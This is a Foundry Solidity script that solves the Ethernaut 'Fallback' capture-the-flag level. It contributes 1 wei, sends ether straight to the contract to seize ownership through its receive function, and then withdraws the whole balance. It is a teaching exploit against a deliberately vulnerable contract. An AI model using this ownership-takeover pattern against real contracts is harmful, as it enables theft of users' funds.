pragma solidity ^0.8.10;

import {Script, console2} from "forge-std/Script.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackScript is Script {
    Ethernaut ethernaut;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        ethernaut = new Ethernaut();
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        ethernautFallback.contribute{value: 1 wei}();
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        console2.log("Fallback contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        console2.log("Fallback contract balance", address(ethernautFallback).balance);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);

        vm.stopBroadcast();
    }
}
